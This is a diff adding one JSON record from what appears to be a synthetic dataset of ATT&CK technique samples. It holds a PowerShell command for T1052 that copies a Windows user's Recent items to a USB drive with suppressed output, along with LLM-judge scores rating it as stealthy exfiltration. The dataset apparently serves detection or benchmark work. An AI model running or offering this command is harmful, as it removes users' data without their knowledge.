@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $dest=\"$dl`:\\media\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; robocopy \"$env:APPDATA\\Microsoft\\Windows\\Recent\" $dest /E /R:1 /W:1 /NFL /NDL /NP /NJH /NJS > \"$dest\\rc.log\"; Write-Output \"Robocopy complete to $dest at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Uses the built-in robocopy tool to mirror the Recent items directory onto a removable drive, maintaining local-only data transfer and logging.",
+  "rationale_steps": [
+    "Determine removable media path",
+    "Create destination directory on USB",
+    "Use robocopy to efficiently copy local files to USB",
+    "Write a local log entry via Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-e0516f06",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with valid cmdlets, parameter usage (including acceptable abbreviations), balanced quotes/parentheses, proper separators, and valid robocopy flags.",
+        "semantic_score": 4,
+        "semantic_justification": "Effectively copies the user's Recent folder to a removable drive (aligning with T1052), but lacks handling for absence of a removable volume and uses /E rather than true mirroring (/MIR).",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:09:51.281664Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, parentheses, and braces, correct variable assignments, proper piping, and valid robocopy parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically identifying a removable drive, creating a directory on it, and exfiltrating Windows Recent Items data using robocopy with minimal output to avoid detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:09:54.161872Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid PowerShell cmdlet usage, proper `robocopy` syntax and flags, and correct command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the intent of exfiltrating data (recent items, which are valuable for reconnaissance) onto a removable physical medium using a robust tool (`robocopy`) with stealthy flags and directing logs to the exfiltration medium, aligning directly with T1052 under 'None' privilege.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T09:10:08.354380Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
